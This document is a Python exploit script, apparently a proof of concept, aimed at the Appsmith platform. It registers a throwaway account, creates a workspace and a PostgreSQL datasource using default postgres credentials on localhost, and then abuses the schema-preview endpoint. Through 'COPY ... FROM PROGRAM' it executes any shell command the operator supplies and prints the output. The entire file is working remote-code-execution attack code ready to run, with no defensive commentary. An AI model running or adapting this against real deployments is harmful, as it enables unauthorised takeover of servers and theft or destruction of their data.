#!/usr/bin/env python3
import requests
import json
import sys
import random
import string

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def exploit(base_url, command):
    session = requests.Session()
    
    email = f"{random_string(20)}@{random_string(10)}.com"
    password = random_string(12)
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Command: {command}")
    print(f"[*] Signing up with: {email}")
    
    signup_url = f"{base_url}/api/v1/users"
    signup_response = session.post(signup_url, data={"email": email, "password": password})
    
    if signup_response.status_code not in [200, 302]:
        print(f"[-] Signup failed: {signup_response.status_code}")
        return False
    print("[+] Signup successful")
    
    login_url = f"{base_url}/api/v1/login"
    login_response = session.post(login_url, data={"username": email, "password": password}, allow_redirects=False)
    
    if login_response.status_code not in [200, 302]:
        print(f"[-] Login failed: {login_response.status_code}")
        return False
    print("[+] Login successful")
    
    workspace_url = f"{base_url}/api/v1/workspaces"
    workspace_response = session.post(workspace_url, 
        headers={"Content-Type": "application/json", "X-Requested-By": "Appsmith"},
        json={"name": f"workspace_{random_string(8)}"})
    
    if workspace_response.status_code not in [200, 201]:
        print(f"[-] Create workspace failed: {workspace_response.status_code}")
        return False
    
    workspace_data = workspace_response.json()
    workspace_id = workspace_data.get("data", {}).get("id")
    print(f"[+] Created workspace: {workspace_id}")
    
    workspace_detail_url = f"{base_url}/api/v1/workspaces/{workspace_id}"
    detail_response = session.get(workspace_detail_url)
    detail_data = detail_response.json()
    
    plugins = detail_data.get("data", {}).get("plugins", [])
    postgres_plugin_id = None
    
    for plugin in plugins:
        plugin_id = plugin.get("pluginId")
        form_url = f"{base_url}/api/v1/plugins/{plugin_id}/form"
        form_response = session.get(form_url)
        if form_response.status_code == 200:
            form_text = form_response.text.lower()
            if "postgres" in form_text:
                postgres_plugin_id = plugin_id
                break
    
    if not postgres_plugin_id:
        print("[-] PostgreSQL plugin not found")
        return False
    print(f"[+] Found PostgreSQL plugin: {postgres_plugin_id}")
    
    env_url = f"{base_url}/api/v1/environments/workspaces/{workspace_id}?fetchDatasourceMeta=true"
    env_response = session.get(env_url)
    env_data = env_response.json()
    environment_id = env_data.get("data", [{}])[0].get("id")
    print(f"[+] Environment ID: {environment_id}")
    
    datasource_url = f"{base_url}/api/v1/datasources"
    datasource_data = {
        "pluginId": postgres_plugin_id,
        "datasourceStorages": {
            environment_id: {
                "datasourceConfiguration": {
                    "properties": [None, {"key": "Connection method", "value": "STANDARD"}],
                    "connection": {"mode": "READ_WRITE", "ssl": {"authType": "DEFAULT"}},
                    "endpoints": [{"port": "5432", "host": "localhost"}],
                    "sshProxy": {"endpoints": [{"port": "22"}]},
                    "authentication": {
                        "databaseName": "postgres",
                        "username": "postgres",
                        "password": "postgres"
                    }
                },
                "datasourceId": "",
                "environmentId": environment_id,
                "isConfigured": True
            }
        },
        "name": f"datasource_{random_string(8)}",
        "workspaceId": workspace_id
    }
    
    ds_response = session.post(datasource_url,
        headers={"Content-Type": "application/json", "X-Requested-By": "Appsmith"},
        json=datasource_data)
    
    if ds_response.status_code not in [200, 201]:
        print(f"[-] Create datasource failed: {ds_response.status_code}")
        print(ds_response.text)
        return False
    
    ds_id = ds_response.json().get("data", {}).get("id")
    print(f"[+] Created datasource: {ds_id}")
    
    schema_url = f"{base_url}/api/v1/datasources/{ds_id}/schema-preview"
    table_name = f"poc_{random_string(6)}"
    
    create_table = session.post(schema_url,
        headers={"Content-Type": "application/json", "X-Requested-By": "Appsmith"},
        json={"title": "SELECT", "body": f"CREATE TEMPORARY TABLE {table_name} (output TEXT);", "suggested": True})
    
    if create_table.status_code != 200:
        print(f"[-] Create table failed: {create_table.status_code}")
        return False
    print(f"[+] Created temporary table: {table_name}")
    
    exec_cmd = session.post(schema_url,
        headers={"Content-Type": "application/json", "X-Requested-By": "Appsmith"},
        json={"title": "SELECT", "body": f"COPY {table_name} FROM PROGRAM '{command}';", "suggested": True})
    
    if exec_cmd.status_code != 200:
        print(f"[-] Execute command failed: {exec_cmd.status_code}")
        return False
    print("[+] Command executed")
    
    read_output = session.post(schema_url,
        headers={"Content-Type": "application/json", "X-Requested-By": "Appsmith"},
        json={"title": "SELECT", "body": f"SELECT * FROM {table_name};", "suggested": True})
    
    if read_output.status_code == 200:
        output_data = read_output.json()
        rows = output_data.get("data", {}).get("body", [])
        print("\n[+] Command output:")
        print("-" * 50)
        for row in rows:
            print(row.get("output", ""))
        print("-" * 50)
    
    return True

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <base_url> <command>")
        print(f"Example: {sys.argv[0]} http://localhost:8080 'id'")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    command = sys.argv[2]
    
    success = exploit(base_url, command)
    
    if success:
        print("\n[+] Exploit completed successfully")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
